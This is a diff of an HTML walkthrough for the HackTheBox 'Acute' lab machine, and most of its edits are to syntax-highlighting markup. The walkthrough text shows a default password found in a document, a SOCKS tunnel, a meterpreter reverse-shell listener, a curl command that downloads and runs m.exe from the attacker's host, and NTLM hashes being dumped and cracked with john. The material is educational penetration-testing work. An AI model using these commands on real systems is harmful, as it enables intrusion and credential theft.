@@ -23,7 +23,7 @@
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 26.62 seconds
-</span></span></code></pre></div><p>This machine has port 443 (HTTPS) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>https://10.10.11.145</code>, we won&rsquo;t see anything:</p><p><img src=/images/HTB/Acute/Acute-not-found.png alt="Web not found"></p><p>We can find a subdomain called <code>atsserver.acute.local</code> in the output of <code>nmap</code>. Now we can add this subdomain to <code>/etc/hosts</code> and <code>acute.local</code> just in case. And we see a website going to <code>https://atsserver.acute.local</code>:</p><p><img src=/images/HTB/Acute/Acute-index.png alt="Acute Health"></p><p>There is an &ldquo;about&rdquo; section where we can download a Microsoft Word document (<code>.docx</code>), clicking on the top-right button called &ldquo;New Starter Forms&rdquo;:</p><p><img src=/images/HTB/Acute/Acute-about.png alt="Acute Health about"></p><p>The Word document tells some instructions for new staff joining the company. Some useful information is here:</p><blockquote><p>The University’s staff induction pages can be found at: <a href=https://atsserver.acute.local/Staff>https://atsserver.acute.local/Staff</a></p></blockquote><blockquote><p>The Staff Induction portal can be found here: <a href=https://atsserver.acute.local/Staff/Induction>https://atsserver.acute.local/Staff/Induction</a></p></blockquote><blockquote><p>Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this</p></blockquote><blockquote><p>Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage</p></blockquote><blockquote><p>Complete the remote (<a href=https://atsserver.acute.local/acute_staff_access>https://atsserver.acute.local/acute_staff_access</a>) training</p></blockquote><blockquote><p>Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin</p></blockquote><p>We found three more web endpoints, although only one works:</p><p><img src=/images/HTB/Acute/Acute-pswa.png alt="Acute PSWA"></p><p>Nice, this is an access to a certain computer via PowerShell (PWSA), but we need credentials and a computer name to connect to.</p><h2 id=enumerating-users>Enumerating users</h2><p>As in most Windows machines, usernames are relevant for exploitation.</p><p>The Word document shows a user called <code>Lois</code> and a potential password: <code>Password1!</code>.</p><p>Looking at the metadata using <code>exiftool</code> we see more things:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>exiftool</span> New_Starter_CheckList_v7.docx
+</span></span></code></pre></div><p>This machine has port 443 (HTTPS) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>https://10.10.11.145</code>, we won&rsquo;t see anything:</p><p><img src=/images/HTB/Acute/Acute-not-found.png alt="Web not found"></p><p>We can find a subdomain called <code>atsserver.acute.local</code> in the output of <code>nmap</code>. Now we can add this subdomain to <code>/etc/hosts</code> and <code>acute.local</code> just in case. And we see a website going to <code>https://atsserver.acute.local</code>:</p><p><img src=/images/HTB/Acute/Acute-index.png alt="Acute Health"></p><p>There is an &ldquo;about&rdquo; section where we can download a Microsoft Word document (<code>.docx</code>), clicking on the top-right button called &ldquo;New Starter Forms&rdquo;:</p><p><img src=/images/HTB/Acute/Acute-about.png alt="Acute Health about"></p><p>The Word document tells some instructions for new staff joining the company. Some useful information is here:</p><blockquote><p>The University’s staff induction pages can be found at: <a href=https://atsserver.acute.local/Staff>https://atsserver.acute.local/Staff</a></p></blockquote><blockquote><p>The Staff Induction portal can be found here: <a href=https://atsserver.acute.local/Staff/Induction>https://atsserver.acute.local/Staff/Induction</a></p></blockquote><blockquote><p>Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this</p></blockquote><blockquote><p>Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage</p></blockquote><blockquote><p>Complete the remote (<a href=https://atsserver.acute.local/acute_staff_access>https://atsserver.acute.local/acute_staff_access</a>) training</p></blockquote><blockquote><p>Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin</p></blockquote><p>We found three more web endpoints, although only one works:</p><p><img src=/images/HTB/Acute/Acute-pswa.png alt="Acute PSWA"></p><p>Nice, this is an access to a certain computer via PowerShell (PWSA), but we need credentials and a computer name to connect to.</p><h2 id=enumerating-users>Enumerating users</h2><p>As in most Windows machines, usernames are relevant for exploitation.</p><p>The Word document shows a user called <code>Lois</code> and a potential password: <code>Password1!</code>.</p><p>Looking at the metadata using <code>exiftool</code> we see more things:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>exiftool</span> <span class=mtku>New_Starter_CheckList_v7.docx</span>
 ExifTool Version Number         : 12.30
 File Name                       : New_Starter_CheckList_v7.docx  
 ...
@@ -267,7 +267,7 @@ server: Fingerprint 5poOpBwlXtp1WxVRCm7EbKeboWO2ERpbS+LdvV4V6CY=
 server: Listening on http://0.0.0.0:1234
 server: session#1: Client version (0.0.0-src) differs from server version (1.7.7)  
 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
-</code></pre></div><p>Let&rsquo;s check that we reach the machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>proxychains4</span> -q nmap -sT -sV -p 445,3389 172.16.22.1
+</code></pre></div><p>Let&rsquo;s check that we reach the machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>#</span> <span class=code-dark-green>proxychains4</span> -q nmap -sT -sV -p 445,3389 172.16.22.1
 Starting Nmap 7.92 ( https://nmap.org )
 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
@@ -287,37 +287,37 @@ No encoder specified, outputting raw payload
 Payload size: 200262 bytes
 Final size of exe file: 206848 bytes
 Saved as: m.exe
-</code></pre></div><p>We start a listener using <code>msfconsole</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>#</span> <span class=code-dark-green>msfconsole</span>
-msf6 &gt; use multi/handler
+</code></pre></div><p>We start a listener using <code>msfconsole</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>#</span> <span class=code-dark-green>msfconsole</span> -q
+<span class=mtku>msf6</span> &gt; use multi/handler
 <span class=code-blue>[*]</span> Using configured payload generic/shell_reverse_tcp
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; set payload windows/x64/meterpreter_reverse_tcp  
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; set payload windows/x64/meterpreter_reverse_tcp  
 payload =&gt; windows/x64/meterpreter_reverse_tcp
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; set LPORT 4444
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; set LPORT 4444
 LPORT =&gt; 4444
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; set LHOST 10.10.17.44
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; set LHOST 10.10.17.44
 LHOST =&gt; 10.10.17.44
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; run
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; run
 
 <span class=code-blue>[*]</span> Started reverse TCP handler on 10.10.17.44:4444
 </code></pre></div><p>Then we upload the binary and run it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Utils&gt; <span class=code-yellow>curl</span> http://10.10.17.44/m.exe <span class=code-grey>-o</span> m.exe  
 PS C:\Utils&gt; <span class=code-yellow>.\m.exe</span>
-</code></pre></div><p>And we receive the connection:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>#</span> <span class=code-dark-green>msfconsole</span>
-msf6 &gt; use multi/handler
+</code></pre></div><p>And we receive the connection:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>#</span> <span class=code-dark-green>msfconsole</span> -q
+<span class=mtku>msf6</span> &gt; use multi/handler
 <span class=code-blue>[*]</span> Using configured payload generic/shell_reverse_tcp
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; set payload windows/x64/meterpreter_reverse_tcp  
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; set payload windows/x64/meterpreter_reverse_tcp  
 payload =&gt; windows/x64/meterpreter_reverse_tcp
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; set LPORT 4444
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; set LPORT 4444
 LPORT =&gt; 4444
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; set LHOST 10.10.17.44
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; set LHOST 10.10.17.44
 LHOST =&gt; 10.10.17.44
-msf6 exploit(<span class=code-red>multi/handler</span>) &gt; run
+<span class=mtku>msf6</span> exploit(<span class=code-red>multi/handler</span>) &gt; run
 
 <span class=code-blue>[*]</span> Started reverse TCP handler on 10.10.17.44:4444
 <span class=code-blue>[*]</span> Meterpreter session 1 opened (10.10.17.44:4444 -&gt; 10.10.11.145:49842)
 
-meterpreter &gt; getuid
+<span class=mtku>meterpreter</span> &gt; getuid
 Server username: ACUTE\edavies
-meterpreter &gt; screenshare
+<span class=mtku>meterpreter</span> &gt; screenshare
 <span class=code-blue>[*]</span> Preparing player...
 <span class=code-blue>[*]</span> Opening player at: ./xjWtVNMB.html
 <span class=code-blue>[*]</span> Streaming...
@@ -584,13 +584,13 @@ Supplemental Credentials:
       des_cbc_md5       : 978a07d05ba770f7
     OldCredentials
       des_cbc_md5       : 1089e6eca449c731
-</code></pre></div><p>From the above output, we get the following NTLM hashes:</p><ul><li><code>Administrator:a29f7623fd11550def0192de9246f46b</code></li><li><code>Natasha:29ab86c5c4d2aab957763e5c1720486d</code></li><li><code>WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740</code></li></ul><p>Instead of using Pass the Hash, we will crack these hashes using <code>john</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'Administrator:a29f7623fd11550def0192de9246f46b'</span> >> hashes
+</code></pre></div><p>From the above output, we get the following NTLM hashes:</p><ul><li><code>Administrator:a29f7623fd11550def0192de9246f46b</code></li><li><code>Natasha:29ab86c5c4d2aab957763e5c1720486d</code></li><li><code>WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740</code></li></ul><p>Instead of using Pass the Hash, we will crack these hashes using <code>john</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'Administrator:a29f7623fd11550def0192de9246f46b'</span> &gt;&gt; hashes
 
-<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'Natasha:29ab86c5c4d2aab957763e5c1720486d'</span> >> hashes
+<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'Natasha:29ab86c5c4d2aab957763e5c1720486d'</span> &gt;&gt; <span class=mtku>hashes</span>
 
-<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740'</span> >> hashes
+<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740'</span> &gt;&gt; <span class=mtku>hashes</span>
 
-<span class=code-cyan>$</span> <span class=code-dark-green>john</span> --wordlist=$WORDLISTS/rockyou.txt --format=NT hashes
+<span class=code-cyan>$</span> <span class=code-dark-green>john</span> --wordlist=$WORDLISTS/rockyou.txt --format=NT <span class=mtku>hashes</span>
 Using default input encoding: UTF-8
 Loaded 3 password hashes with no different salts (NT [MD4 128/128 ASIMD 4x2])
 Press 'q' or Ctrl-C to abort, almost any other key for status
